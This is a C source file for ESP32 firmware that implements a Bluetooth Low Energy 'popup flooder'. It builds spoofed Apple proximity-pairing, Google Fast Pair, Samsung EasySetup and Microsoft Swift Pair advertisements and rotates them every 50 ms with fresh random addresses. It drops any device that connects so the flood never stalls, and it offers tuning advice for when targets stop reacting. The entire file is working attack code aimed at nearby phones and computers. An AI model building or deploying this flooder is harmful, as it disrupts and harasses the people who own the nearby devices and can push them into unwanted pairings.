/*
 * ble_spam.c — BLE advertising-spam popup flooder. See ble_spam.h.
 *
 * A single worker task cycles: build a vendor "nearby device" advertisement,
 * assign a fresh random advertiser address, advertise it briefly, then rotate.
 * Runs on the shared NimBLE host (ble_host_ensure_started). Advertising is
 * connectable-undirected (ADV_IND) because Fast Pair / Swift Pair popups are far
 * more reliable when connectable; a stray central connection is dropped
 * immediately in the GAP callback so the fast rotation never stalls.
 *
 * Payload formats follow the well-known public BLE-spam definitions (Apple
 * continuity proximity-pairing, Google Fast Pair service data, Samsung EasySetup
 * watch beacon, Microsoft Swift Pair beacon). Popup behaviour is target-OS
 * dependent; the model tables below are a representative subset and are the first
 * knobs to tune if a given target stops reacting.
 */

#include <string.h>
#include <stdio.h>

#include "esp_err.h"
#include "esp_log.h"
#include "esp_random.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "nimble/ble.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"

#include "ble_hid.h"       /* ble_host_ensure_started / ble_host_own_addr_type */
#include "ble_spam.h"

#define TAG "BLE_SPAM"

#define SPAM_BURST_MS   50          /* how long each spoofed device advertises */
#define SPAM_STACK      3072

static volatile bool s_running;
static volatile uint8_t s_mode;
static TaskHandle_t s_task;         /* worker NULLs this just before self-delete */

/* ---- payload builders: each writes into `b` (>=31 bytes) and returns length ---- */

/* Apple continuity "proximity pairing" (0x07): triggers the iOS pairing card. */
static uint8_t build_apple(uint8_t *b)
{
    static const struct { uint8_t prefix; uint16_t model; } models[] = {
        { 0x07, 0x0E20 },  /* AirPods Pro   */
        { 0x07, 0x0A20 },  /* AirPods Max   */
        { 0x07, 0x0220 },  /* AirPods       */
        { 0x07, 0x0055 },  /* AirTag        */
        { 0x07, 0x0030 },  /* "Setup" card  */
        { 0x01, 0x0E20 },  /* new-device variant */
        { 0x05, 0x0030 },  /* Apple Pencil-style */
    };
    unsigned i = esp_random() % (sizeof(models) / sizeof(models[0]));
    uint16_t m = models[i].model;

    b[0] = 0x1E;               /* AD length (30) */
    b[1] = 0xFF;               /* manufacturer specific */
    b[2] = 0x4C; b[3] = 0x00;  /* Apple, Inc. (0x004C) */
    b[4] = 0x07;               /* continuity type: proximity pairing */
    b[5] = 0x19;               /* continuity length (25 bytes follow) */
    b[6] = models[i].prefix;
    b[7] = (uint8_t)(m >> 8);
    b[8] = (uint8_t)(m & 0xFF);
    b[9] = 0x55;               /* status */
    for (int k = 10; k < 31; k++) b[k] = (uint8_t)esp_random();  /* battery/enc tail */
    return 31;
}

/* Google Fast Pair: service-data 0xFE2C + 3-byte model id -> Android pair sheet. */
static uint8_t build_fastpair(uint8_t *b)
{
    static const uint32_t models[] = {
        0xCD8256, 0x0002F0, 0x992BA5, 0x02AAB9, 0x02D815,
        0x0002B0, 0x718FA4, 0xF52494, 0x000047, 0x00000A,
    };
    uint32_t id = models[esp_random() % (sizeof(models) / sizeof(models[0]))];
    uint8_t i = 0;
    b[i++] = 0x02; b[i++] = 0x01; b[i++] = 0x06;              /* flags */
    b[i++] = 0x06; b[i++] = 0x16; b[i++] = 0x2C; b[i++] = 0xFE;/* service data UUID 0xFE2C */
    b[i++] = (uint8_t)(id >> 16);
    b[i++] = (uint8_t)(id >> 8);
    b[i++] = (uint8_t)(id);
    b[i++] = 0x02; b[i++] = 0x0A; b[i++] = (uint8_t)(esp_random() % 0x0B); /* tx power */
    return i;                                                  /* 13 */
}

/* Samsung EasySetup "watch" beacon (mfg 0x0075) -> Galaxy pairing popup. */
static uint8_t build_samsung(uint8_t *b)
{
    static const uint8_t models[] = { 0x1A, 0x01, 0x1C, 0x02, 0x03, 0x11, 0x1D };
    uint8_t tmpl[15] = {
        0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00 /* [14] = model */
    };
    tmpl[14] = models[esp_random() % sizeof(models)];
    memcpy(b, tmpl, sizeof(tmpl));
    return sizeof(tmpl);                                       /* 15 */
}

/* Microsoft Swift Pair beacon (mfg 0x0006) -> Windows "Add a device?" toast. */
static uint8_t build_swiftpair(uint8_t *b)
{
    char name[12];
    int nlen = snprintf(name, sizeof(name), "M1-%04X", (unsigned)(esp_random() & 0xFFFF));
    if (nlen < 0) nlen = 0;
    if (nlen > (int)sizeof(name) - 1) nlen = sizeof(name) - 1;

    b[0] = (uint8_t)(6 + nlen);   /* AD length */
    b[1] = 0xFF;                  /* manufacturer specific */
    b[2] = 0x06; b[3] = 0x00;     /* Microsoft (0x0006) */
    b[4] = 0x03;                  /* Microsoft Beacon ID */
    b[5] = 0x00;                  /* Beacon sub-scenario */
    b[6] = 0x80;                  /* reserved / RSSI flag */
    memcpy(&b[7], name, (size_t)nlen);
    return (uint8_t)(7 + nlen);
}

static uint8_t build_packet(uint8_t mode, uint8_t *b)
{
    switch (mode) {
    case BLE_SPAM_MODE_APPLE:     return build_apple(b);
    case BLE_SPAM_MODE_FASTPAIR:  return build_fastpair(b);
    case BLE_SPAM_MODE_SAMSUNG:   return build_samsung(b);
    case BLE_SPAM_MODE_SWIFTPAIR: return build_swiftpair(b);
    default:                      return build_apple(b);
    }
}

/* Drop any central that connects to a spoofed advert so rotation never stalls. */
static int spam_gap_event(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_CONNECT && event->connect.status == 0)
        ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    return 0;
}

/* One advertise burst: fresh random address + fresh payload. */
static void spam_once(uint8_t mode)
{
    uint8_t adv[31];
    uint8_t len = build_packet(mode, adv);

    /* Fresh static-random advertiser address (top two bits = 0b11). */
    uint8_t rnd[6];
    for (int i = 0; i < 6; i++) rnd[i] = (uint8_t)esp_random();
    rnd[5] |= 0xC0;

    /* Connectable (ADV_IND) so proximity-pair popups trigger; spam_gap_event
     * drops any central that connects. Raw payload, no scan response. Runs on its
     * own ext-adv instance so it no longer fights HID/NUS for a single slot. */
    ble_extadv_start(BLE_ADV_INST_SPAM, true, rnd, adv, len, NULL, 0,
                     spam_gap_event, NULL);
}

static void spam_task(void *arg)
{
    (void)arg;
    uint32_t rr = 0;
    while (s_running) {
        uint8_t m = (s_mode == BLE_SPAM_MODE_ALL) ? (uint8_t)(rr++ & 0x3) : s_mode;
        spam_once(m);
        vTaskDelay(pdMS_TO_TICKS(SPAM_BURST_MS));
    }
    ble_extadv_stop(BLE_ADV_INST_SPAM);
    s_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t ble_spam_start(uint8_t mode)
{
    if (s_running) return ESP_ERR_INVALID_STATE;

    esp_err_t err = ble_host_ensure_started();
    if (err != ESP_OK) return err;

    /* Own ext-adv instance now, so no need to stop HID/NUS first. */
    ble_extadv_stop(BLE_ADV_INST_SPAM);

    s_mode    = (mode > BLE_SPAM_MODE_ALL) ? BLE_SPAM_MODE_ALL : mode;
    s_running = true;
    if (xTaskCreate(spam_task, "ble_spam", SPAM_STACK, NULL, 6, &s_task) != pdPASS) {
        s_running = false;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "spam start mode=%u", s_mode);
    return ESP_OK;
}

void ble_spam_stop(void)
{
    if (!s_running) return;
    s_running = false;
    /* Wait for the worker to stop advertising and self-delete (~up to 600ms). */
    for (int i = 0; i < 120 && s_task != NULL; i++)
        vTaskDelay(pdMS_TO_TICKS(5));
    ble_extadv_stop(BLE_ADV_INST_SPAM);
    ESP_LOGI(TAG, "spam stop");
}

bool ble_spam_is_running(void)
{
    return s_running;
}
